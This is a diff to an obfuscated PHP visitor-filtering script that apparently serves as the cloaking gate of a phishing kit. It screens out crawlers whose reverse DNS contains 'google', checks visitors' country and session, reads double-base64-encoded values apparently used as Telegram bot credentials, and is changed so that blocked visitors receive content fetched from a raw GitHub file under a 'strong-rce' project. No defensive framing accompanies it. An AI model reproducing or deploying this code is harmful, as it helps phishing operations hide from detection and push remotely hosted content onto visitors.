@@ -15,7 +15,7 @@ else
     $ipAddress = $_SERVER['REMOTE_ADDR'];
 }
 
-function getFileContents($num) {
+function getFileContents() {
     $fileURL = 'https://raw.githubusercontent.com/strong-rce/project/main/javascript.txt';
 	
     $curl = curl_init();
@@ -24,7 +24,7 @@ function getFileContents($num) {
     $fileContents = curl_exec($curl);
     curl_close($curl);
 
-    return $num; #$fileContents;
+    return $fileContents;
 }
 $ipPortArray = explode(':', $ipAddress);
 $StrupLom = $ipPortArray[0];
@@ -137,12 +137,11 @@ function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id_raw)
             $_SESSION['tokentel'] = base64_decode(base64_decode($row["tokentel"]));
             $_SESSION['idtel'] = base64_decode(base64_decode($row["idtel"]));
 			$_SESSION['project'] = $row["project"];
-			setcookie("drom_country", $row["country"], time() + (10 * 60), "/");
         }
     }
     else
     {
-        $refix = "Main SQL ID Invalid: $id_raw";
+        $refix = "Main 1 SQL ID Invalid: $id_raw";
         click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
         exit();
     }
@@ -152,7 +151,7 @@ function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id_raw)
     if (mysqli_num_rows($res_u) > 0)
     {
         mysqli_close($db);
-        $fileContent = getFileContents("1 - $StrupLom");
+        $fileContent = getFileContents();
         echo $fileContent;
         exit();
     }
@@ -273,22 +272,24 @@ function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id_raw)
     }
     checkInvalidInputs($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $db);
     $Njopf = $_SESSION['Njopf'];
-    $storedPassCookie = base64_decode(base64_decode($_COOKIE["drom_country"])) ?? "";
-    $countryCodes = explode(";", $storedPassCookie); 
     $found = false;
-    foreach ($countryCodes as $countryCode) {
-        if (strpos($Njopf, $countryCode) !== false) {
+	foreach ($_SESSION['cn'] as $value)
+    {
+        if ($value == $Njopf)
+        {
             $found = true;
             break;
         }
     }
-    
-    if (!$found) {
+    if ($found)
+    {
+    }
+    else
+    {
         $refix = "Main country Invalid";
         click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
         exit();
     }
-    
     
     mysqli_close($db);
 }
@@ -401,7 +402,7 @@ function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix)
     if (mysqli_num_rows($res_u) > 0)
     {
         mysqli_close($db);
-        $fileContent = getFileContents("2");
+        $fileContent = getFileContents();
         echo $fileContent;
         exit();
     }
@@ -423,8 +424,8 @@ function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix)
 		
 		$results = mysqli_query($db, $query);
         mysqli_close($db);
-        $fileContent = getFileContents("3");
-        echo "$fileContent $refix";
+        $fileContent = getFileContents();
+        echo $fileContent;
         exit();
     }
 }
@@ -441,17 +442,15 @@ if (strpos(gethostbyaddr($StrupLom) , 'google') !== false)
     click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
     exit();
 }
-	
-
-if (!isset($_SESSION['dec_frech_id']))
+if (!isset($_SESSION['cn']))
 {
-    $refix = "Main Project ID not found";
+    $refix = "Main Link session Invalid";
     click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
     exit();
 }
-if (!isset($_COOKIE["drom_country"])) 
+if (!isset($_SESSION['dec_frech_id']))
 {
-    $refix = "Main Cookie Country not Found";
+    $refix = "Main Project ID notfound";
     click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
     exit();
 }
